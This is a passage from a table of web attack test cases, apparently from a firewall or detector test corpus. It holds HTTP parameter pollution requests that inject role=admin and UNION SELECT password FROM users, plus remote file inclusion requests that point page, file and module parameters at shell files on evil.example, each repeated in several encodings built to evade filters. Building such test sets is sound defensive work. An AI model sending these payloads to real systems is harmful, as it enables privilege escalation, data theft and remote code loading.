| ` hpp/variant-02615 ` | ` hpp/v06-query ` | ` query-lower-hex ` | GET | ` /api/update?%75%73%65%72%20%6e%61%6d%65=%61%6c%69%63%65&%75%73%65%72%5f%6e%61%6d%65=%61%64%6d%69%6e ` | (empty) | 97 |
| ` hpp/variant-02616 ` | ` hpp/v06-query ` | ` query-percent-space ` | GET | ` /api/update?user%20name=alice&user_name=admin ` | (empty) | 97 |
| ` hpp/variant-02617 ` | ` hpp/v06-form ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %75%73%65%72%20%6E%61%6D%65=alice&%75%73%65%72%5F%6E%61%6D%65=admin ` | 97 |
| ` hpp/variant-02618 ` | ` hpp/v06-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` user+name=%61%6C%69%63%65&user_name=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02619 ` | ` hpp/v06-form ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %75%73%65%72%20%6E%61%6D%65=%61%6C%69%63%65&%75%73%65%72%5F%6E%61%6D%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02620 ` | ` hpp/v06-form ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %75%73%65%72%20%6e%61%6d%65=%61%6c%69%63%65&%75%73%65%72%5f%6e%61%6d%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-02621 ` | ` hpp/v06-form ` | ` form-percent-space ` | POST | ` /api/update ` | ` user%20name=alice&user_name=admin ` | 97 |
| ` hpp/variant-02634 ` | ` hpp/v08-query ` | ` query-encoded-name ` | GET | ` /api/update?%71=UNION&%71=SELECT+password+FROM+users ` | (empty) | 97 |
| ` hpp/variant-02635 ` | ` hpp/v08-query ` | ` query-encoded-value ` | GET | ` /api/update?q=%55%4E%49%4F%4E&q=%53%45%4C%45%43%54%20%70%61%73%73%77%6F%72%64%20%46%52%4F%4D%20%75%73%65%72%73 ` | (empty) | 97 |
| ` hpp/variant-02636 ` | ` hpp/v08-query ` | ` query-encoded-both ` | GET | ` /api/update?%71=%55%4E%49%4F%4E&%71=%53%45%4C%45%43%54%20%70%61%73%73%77%6F%72%64%20%46%52%4F%4D%20%75%73%65%72%73 ` | (empty) | 97 |
| ` hpp/variant-02637 ` | ` hpp/v08-query ` | ` query-lower-hex ` | GET | ` /api/update?%71=%55%4e%49%4f%4e&%71=%53%45%4c%45%43%54%20%70%61%73%73%77%6f%72%64%20%46%52%4f%4d%20%75%73%65%72%73 ` | (empty) | 97 |
| ` hpp/variant-02638 ` | ` hpp/v08-query ` | ` query-percent-space ` | GET | ` /api/update?q=UNION&q=SELECT%20password%20FROM%20users ` | (empty) | 97 |
| ` hpp/variant-02639 ` | ` hpp/v08-form ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %71=UNION&%71=SELECT+password+FROM+users ` | 97 |
| ` hpp/variant-02640 ` | ` hpp/v08-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` q=%55%4E%49%4F%4E&q=%53%45%4C%45%43%54%20%70%61%73%73%77%6F%72%64%20%46%52%4F%4D%20%75%73%65%72%73 ` | 97 |
| ` hpp/variant-02641 ` | ` hpp/v08-form ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %71=%55%4E%49%4F%4E&%71=%53%45%4C%45%43%54%20%70%61%73%73%77%6F%72%64%20%46%52%4F%4D%20%75%73%65%72%73 ` | 97 |
| ` hpp/variant-02642 ` | ` hpp/v08-form ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %71=%55%4e%49%4f%4e&%71=%53%45%4c%45%43%54%20%70%61%73%73%77%6f%72%64%20%46%52%4f%4d%20%75%73%65%72%73 ` | 97 |
| ` hpp/variant-02643 ` | ` hpp/v08-form ` | ` form-percent-space ` | POST | ` /api/update ` | ` q=UNION&q=SELECT%20password%20FROM%20users ` | 97 |
| ` hpp/variant-02654 ` | ` hpp/v11-query ` | ` query-encoded-name ` | GET | ` /api/update?%65%6E%61%62%6C%65%64=false&%65%6E%61%62%6C%65%64=true ` | (empty) | 97 |
| ` hpp/variant-02655 ` | ` hpp/v11-query ` | ` query-encoded-value ` | GET | ` /api/update?enabled=%66%61%6C%73%65&enabled=%74%72%75%65 ` | (empty) | 97 |
| ` hpp/variant-02656 ` | ` hpp/v11-query ` | ` query-encoded-both ` | GET | ` /api/update?%65%6E%61%62%6C%65%64=%66%61%6C%73%65&%65%6E%61%62%6C%65%64=%74%72%75%65 ` | (empty) | 97 |
| ` hpp/variant-02657 ` | ` hpp/v11-query ` | ` query-lower-hex ` | GET | ` /api/update?%65%6e%61%62%6c%65%64=%66%61%6c%73%65&%65%6e%61%62%6c%65%64=%74%72%75%65 ` | (empty) | 97 |
| ` hpp/variant-02658 ` | ` hpp/v11-form ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %65%6E%61%62%6C%65%64=false&%65%6E%61%62%6C%65%64=true ` | 97 |
| ` hpp/variant-02659 ` | ` hpp/v11-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` enabled=%66%61%6C%73%65&enabled=%74%72%75%65 ` | 97 |
| ` hpp/variant-02660 ` | ` hpp/v11-form ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %65%6E%61%62%6C%65%64=%66%61%6C%73%65&%65%6E%61%62%6C%65%64=%74%72%75%65 ` | 97 |
| ` hpp/variant-02661 ` | ` hpp/v11-form ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %65%6e%61%62%6c%65%64=%66%61%6c%73%65&%65%6e%61%62%6c%65%64=%74%72%75%65 ` | 97 |
| ` hpp/variant-02662 ` | ` hpp/v12-query ` | ` query-encoded-name ` | GET | ` /api/update?%69%64%73%5B%30%5D=1&%69%64%73%5B%30%5D=2 ` | (empty) | 97 |
| ` hpp/variant-02663 ` | ` hpp/v12-query ` | ` query-encoded-value ` | GET | ` /api/update?ids[0]=%31&ids[0]=%32 ` | (empty) | 97 |
| ` hpp/variant-02664 ` | ` hpp/v12-query ` | ` query-encoded-both ` | GET | ` /api/update?%69%64%73%5B%30%5D=%31&%69%64%73%5B%30%5D=%32 ` | (empty) | 97 |
| ` hpp/variant-02665 ` | ` hpp/v12-query ` | ` query-lower-hex ` | GET | ` /api/update?%69%64%73%5b%30%5d=%31&%69%64%73%5b%30%5d=%32 ` | (empty) | 97 |
| ` hpp/variant-02666 ` | ` hpp/v12-query ` | ` query-percent-space ` | GET | ` /api/update?ids%5B0%5D=1&ids%5B0%5D=2 ` | (empty) | 97 |
| ` hpp/variant-02667 ` | ` hpp/v12-form ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %69%64%73%5B%30%5D=1&%69%64%73%5B%30%5D=2 ` | 97 |
| ` hpp/variant-02668 ` | ` hpp/v12-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` ids[0]=%31&ids[0]=%32 ` | 97 |
| ` hpp/variant-02669 ` | ` hpp/v12-form ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %69%64%73%5B%30%5D=%31&%69%64%73%5B%30%5D=%32 ` | 97 |
| ` hpp/variant-02670 ` | ` hpp/v12-form ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %69%64%73%5b%30%5d=%31&%69%64%73%5b%30%5d=%32 ` | 97 |
| ` hpp/variant-02671 ` | ` hpp/v12-form ` | ` form-percent-space ` | POST | ` /api/update ` | ` ids%5B0%5D=1&ids%5B0%5D=2 ` | 97 |
| ` hpp/variant-04056 ` | ` hpp/syntax-0317 ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%30%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-04057 ` | ` hpp/syntax-0317 ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[0]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04058 ` | ` hpp/syntax-0317 ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%30%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04059 ` | ` hpp/syntax-0317 ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%30%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-04060 ` | ` hpp/syntax-0317 ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B0%5D=user&role=admin ` | 97 |
| ` hpp/variant-04075 ` | ` hpp/syntax-0327 ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%31%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-04076 ` | ` hpp/syntax-0327 ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[1]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04077 ` | ` hpp/syntax-0327 ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%31%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04078 ` | ` hpp/syntax-0327 ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%31%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-04079 ` | ` hpp/syntax-0327 ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B1%5D=user&role=admin ` | 97 |
| ` hpp/variant-04094 ` | ` hpp/syntax-0337 ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%32%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-04095 ` | ` hpp/syntax-0337 ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[2]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04096 ` | ` hpp/syntax-0337 ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%32%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04097 ` | ` hpp/syntax-0337 ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%32%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-04098 ` | ` hpp/syntax-0337 ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B2%5D=user&role=admin ` | 97 |
| ` hpp/variant-04113 ` | ` hpp/syntax-0347 ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%33%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-04114 ` | ` hpp/syntax-0347 ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[3]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04115 ` | ` hpp/syntax-0347 ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%33%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04116 ` | ` hpp/syntax-0347 ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%33%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-04117 ` | ` hpp/syntax-0347 ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B3%5D=user&role=admin ` | 97 |
| ` hpp/variant-04132 ` | ` hpp/syntax-0357 ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%34%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-04133 ` | ` hpp/syntax-0357 ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[4]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04134 ` | ` hpp/syntax-0357 ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%34%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04135 ` | ` hpp/syntax-0357 ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%34%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-04136 ` | ` hpp/syntax-0357 ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B4%5D=user&role=admin ` | 97 |
| ` hpp/variant-04151 ` | ` hpp/syntax-0367 ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%35%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-04152 ` | ` hpp/syntax-0367 ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[5]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04153 ` | ` hpp/syntax-0367 ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%35%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04154 ` | ` hpp/syntax-0367 ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%35%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-04155 ` | ` hpp/syntax-0367 ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B5%5D=user&role=admin ` | 97 |
| ` hpp/variant-04170 ` | ` hpp/syntax-0377 ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%36%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-04171 ` | ` hpp/syntax-0377 ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[6]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04172 ` | ` hpp/syntax-0377 ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%36%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04173 ` | ` hpp/syntax-0377 ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%36%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-04174 ` | ` hpp/syntax-0377 ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B6%5D=user&role=admin ` | 97 |
| ` hpp/variant-04189 ` | ` hpp/syntax-0387 ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%37%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-04190 ` | ` hpp/syntax-0387 ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[7]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04191 ` | ` hpp/syntax-0387 ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%37%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-04192 ` | ` hpp/syntax-0387 ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%37%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-04193 ` | ` hpp/syntax-0387 ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B7%5D=user&role=admin ` | 97 |

## Remote file inclusion

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` rfi/83 ` | (original) | (original) | GET | ` /?page=http://evil.example/shell.txt ` | (empty) | 98 |
| ` rfi/85 ` | (original) | (original) | GET | ` /?file=ftp://evil.example/x ` | (empty) | 98 |
| ` rfi/86 ` | (original) | (original) | GET | ` /?module=//evil.example/shell.php ` | (empty) | 98 |
| ` rfi/88 ` | (original) | (original) | GET | ` /?page=https://pastebin.example/raw/abc.php ` | (empty) | 98 |
| ` rfi/syntax-0081 ` | ` rfi/syntax-family ` | ` syntax-00-query ` | GET | ` /api/loadtest/rfi?input=http%3A%2F%2Fevil.example%2Floadtest.php ` | (empty) | 98 |
| ` rfi/syntax-0082 ` | ` rfi/syntax-family ` | ` syntax-00-form ` | POST | ` /api/loadtest/rfi ` | ` input=http%3A%2F%2Fevil.example%2Floadtest.php ` | 98 |
| ` rfi/syntax-0083 ` | ` rfi/syntax-family ` | ` syntax-00-json ` | POST | ` /api/loadtest/rfi ` | ` {"input":"http://evil.example/loadtest.php"} ` | 98 |
| ` rfi/syntax-0084 ` | ` rfi/syntax-family ` | ` syntax-01-query ` | GET | ` /api/loadtest/rfi?input=https%3A%2F%2Fevil.example%2Floadtest.txt ` | (empty) | 98 |
| ` rfi/syntax-0085 ` | ` rfi/syntax-family ` | ` syntax-01-form ` | POST | ` /api/loadtest/rfi ` | ` input=https%3A%2F%2Fevil.example%2Floadtest.txt ` | 98 |
| ` rfi/syntax-0086 ` | ` rfi/syntax-family ` | ` syntax-01-json ` | POST | ` /api/loadtest/rfi ` | ` {"input":"https://evil.example/loadtest.txt"} ` | 98 |
| ` rfi/syntax-0087 ` | ` rfi/syntax-family ` | ` syntax-02-query ` | GET | ` /api/loadtest/rfi?input=ftp%3A%2F%2Fevil.example%2Floadtest.php ` | (empty) | 98 |
| ` rfi/syntax-0088 ` | ` rfi/syntax-family ` | ` syntax-02-form ` | POST | ` /api/loadtest/rfi ` | ` input=ftp%3A%2F%2Fevil.example%2Floadtest.php ` | 98 |
| ` rfi/syntax-0089 ` | ` rfi/syntax-family ` | ` syntax-02-json ` | POST | ` /api/loadtest/rfi ` | ` {"input":"ftp://evil.example/loadtest.php"} ` | 98 |
| ` rfi/syntax-0090 ` | ` rfi/syntax-family ` | ` syntax-03-query ` | GET | ` /api/loadtest/rfi?input=%2F%2Fevil.example%2Floadtest.php ` | (empty) | 98 |
| ` rfi/syntax-0091 ` | ` rfi/syntax-family ` | ` syntax-03-form ` | POST | ` /api/loadtest/rfi ` | ` input=%2F%2Fevil.example%2Floadtest.php ` | 98 |
| ` rfi/syntax-0092 ` | ` rfi/syntax-family ` | ` syntax-03-json ` | POST | ` /api/loadtest/rfi ` | ` {"input":"//evil.example/loadtest.php"} ` | 98 |
| ` rfi/syntax-0093 ` | ` rfi/syntax-family ` | ` syntax-04-query ` | GET | ` /api/loadtest/rfi?input=http%3A%2F%2Fevil.example%3A8080%2Floadtest.php ` | (empty) | 98 |
| ` rfi/syntax-0094 ` | ` rfi/syntax-family ` | ` syntax-04-form ` | POST | ` /api/loadtest/rfi ` | ` input=http%3A%2F%2Fevil.example%3A8080%2Floadtest.php ` | 98 |
| ` rfi/syntax-0095 ` | ` rfi/syntax-family ` | ` syntax-04-json ` | POST | ` /api/loadtest/rfi ` | ` {"input":"http://evil.example:8080/loadtest.php"} ` | 98 |
| ` rfi/syntax-0096 ` | ` rfi/syntax-family ` | ` syntax-05-query ` | GET | ` /api/loadtest/rfi?input=https%3A%2F%2Fevil.example%2Floadtest.php%3Fx%3D1 ` | (empty) | 98 |
| ` rfi/syntax-0097 ` | ` rfi/syntax-family ` | ` syntax-05-form ` | POST | ` /api/loadtest/rfi ` | ` input=https%3A%2F%2Fevil.example%2Floadtest.php%3Fx%3D1 ` | 98 |
| ` rfi/syntax-0098 ` | ` rfi/syntax-family ` | ` syntax-05-json ` | POST | ` /api/loadtest/rfi ` | ` {"input":"https://evil.example/loadtest.php?x=1"} ` | 98 |
| ` rfi/variant-01424 ` | ` rfi/83 ` | ` query-encoded-name ` | GET | ` /?%70%61%67%65=http://evil.example/shell.txt ` | (empty) | 98 |
| ` rfi/variant-01425 ` | ` rfi/83 ` | ` query-encoded-value ` | GET | ` /?page=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%73%68%65%6C%6C%2E%74%78%74 ` | (empty) | 98 |
| ` rfi/variant-01426 ` | ` rfi/83 ` | ` query-encoded-both ` | GET | ` /?%70%61%67%65=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%73%68%65%6C%6C%2E%74%78%74 ` | (empty) | 98 |
| ` rfi/variant-01427 ` | ` rfi/83 ` | ` query-lower-hex ` | GET | ` /?%70%61%67%65=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%73%68%65%6c%6c%2e%74%78%74 ` | (empty) | 98 |
| ` rfi/variant-01428 ` | ` rfi/83 ` | ` query-percent-space ` | GET | ` /?page=http%3A%2F%2Fevil.example%2Fshell.txt ` | (empty) | 98 |
| ` rfi/variant-01434 ` | ` rfi/85 ` | ` query-encoded-name ` | GET | ` /?%66%69%6C%65=ftp://evil.example/x ` | (empty) | 98 |
| ` rfi/variant-01435 ` | ` rfi/85 ` | ` query-encoded-value ` | GET | ` /?file=%66%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%78 ` | (empty) | 98 |
| ` rfi/variant-01436 ` | ` rfi/85 ` | ` query-encoded-both ` | GET | ` /?%66%69%6C%65=%66%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%78 ` | (empty) | 98 |
| ` rfi/variant-01437 ` | ` rfi/85 ` | ` query-lower-hex ` | GET | ` /?%66%69%6c%65=%66%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%78 ` | (empty) | 98 |
| ` rfi/variant-01438 ` | ` rfi/85 ` | ` query-percent-space ` | GET | ` /?file=ftp%3A%2F%2Fevil.example%2Fx ` | (empty) | 98 |
| ` rfi/variant-01439 ` | ` rfi/86 ` | ` query-encoded-name ` | GET | ` /?%6D%6F%64%75%6C%65=//evil.example/shell.php ` | (empty) | 98 |
| ` rfi/variant-01440 ` | ` rfi/86 ` | ` query-encoded-value ` | GET | ` /?module=%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%73%68%65%6C%6C%2E%70%68%70 ` | (empty) | 98 |
| ` rfi/variant-01441 ` | ` rfi/86 ` | ` query-encoded-both ` | GET | ` /?%6D%6F%64%75%6C%65=%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%73%68%65%6C%6C%2E%70%68%70 ` | (empty) | 98 |
| ` rfi/variant-01442 ` | ` rfi/86 ` | ` query-lower-hex ` | GET | ` /?%6d%6f%64%75%6c%65=%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%73%68%65%6c%6c%2e%70%68%70 ` | (empty) | 98 |
| ` rfi/variant-01443 ` | ` rfi/86 ` | ` query-percent-space ` | GET | ` /?module=%2F%2Fevil.example%2Fshell.php ` | (empty) | 98 |
| ` rfi/variant-01449 ` | ` rfi/88 ` | ` query-encoded-name ` | GET | ` /?%70%61%67%65=https://pastebin.example/raw/abc.php ` | (empty) | 98 |
| ` rfi/variant-01450 ` | ` rfi/88 ` | ` query-encoded-value ` | GET | ` /?page=%68%74%74%70%73%3A%2F%2F%70%61%73%74%65%62%69%6E%2E%65%78%61%6D%70%6C%65%2F%72%61%77%2F%61%62%63%2E%70%68%70 ` | (empty) | 98 |
| ` rfi/variant-01451 ` | ` rfi/88 ` | ` query-encoded-both ` | GET | ` /?%70%61%67%65=%68%74%74%70%73%3A%2F%2F%70%61%73%74%65%62%69%6E%2E%65%78%61%6D%70%6C%65%2F%72%61%77%2F%61%62%63%2E%70%68%70 ` | (empty) | 98 |
| ` rfi/variant-01452 ` | ` rfi/88 ` | ` query-lower-hex ` | GET | ` /?%70%61%67%65=%68%74%74%70%73%3a%2f%2f%70%61%73%74%65%62%69%6e%2e%65%78%61%6d%70%6c%65%2f%72%61%77%2f%61%62%63%2e%70%68%70 ` | (empty) | 98 |
| ` rfi/variant-01453 ` | ` rfi/88 ` | ` query-percent-space ` | GET | ` /?page=https%3A%2F%2Fpastebin.example%2Fraw%2Fabc.php ` | (empty) | 98 |
| ` rfi/variant-03151 ` | ` rfi/syntax-0081 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=http%3A%2F%2Fevil.example%2Floadtest.php ` | (empty) | 97 |
| ` rfi/variant-03152 ` | ` rfi/syntax-0081 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rfi?input=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03153 ` | ` rfi/syntax-0081 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03154 ` | ` rfi/syntax-0081 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rfi?%69%6e%70%75%74=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03155 ` | ` rfi/syntax-0082 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=http%3A%2F%2Fevil.example%2Floadtest.php ` | 97 |
| ` rfi/variant-03156 ` | ` rfi/syntax-0082 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rfi ` | ` input=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | 97 |
| ` rfi/variant-03157 ` | ` rfi/syntax-0082 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | 97 |
| ` rfi/variant-03158 ` | ` rfi/syntax-0082 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rfi ` | ` %69%6e%70%75%74=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70 ` | 97 |
| ` rfi/variant-03159 ` | ` rfi/syntax-0083 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rfi ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0065\u0076\u0069\u006c\u002e\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u002f\u006c\u006f\u0061\u0064\u0074\u0065\u0073\u0074\u002e\u0070\u0068\u0070"} ` | 97 |
| ` rfi/variant-03160 ` | ` rfi/syntax-0083 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rfi ` | ` {\n "input": "http://evil.example/loadtest.php"\n} ` | 97 |
| ` rfi/variant-03161 ` | ` rfi/syntax-0083 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rfi ` | ` {\n\t"input": "http://evil.example/loadtest.php"\n} ` | 97 |
| ` rfi/variant-03162 ` | ` rfi/syntax-0084 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=https%3A%2F%2Fevil.example%2Floadtest.txt ` | (empty) | 97 |
| ` rfi/variant-03163 ` | ` rfi/syntax-0084 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rfi?input=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%74%78%74 ` | (empty) | 97 |
| ` rfi/variant-03164 ` | ` rfi/syntax-0084 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%74%78%74 ` | (empty) | 97 |
| ` rfi/variant-03165 ` | ` rfi/syntax-0084 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rfi?%69%6e%70%75%74=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%74%78%74 ` | (empty) | 97 |
| ` rfi/variant-03166 ` | ` rfi/syntax-0085 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=https%3A%2F%2Fevil.example%2Floadtest.txt ` | 97 |
| ` rfi/variant-03167 ` | ` rfi/syntax-0085 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rfi ` | ` input=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%74%78%74 ` | 97 |
| ` rfi/variant-03168 ` | ` rfi/syntax-0085 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%74%78%74 ` | 97 |
| ` rfi/variant-03169 ` | ` rfi/syntax-0085 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rfi ` | ` %69%6e%70%75%74=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%74%78%74 ` | 97 |
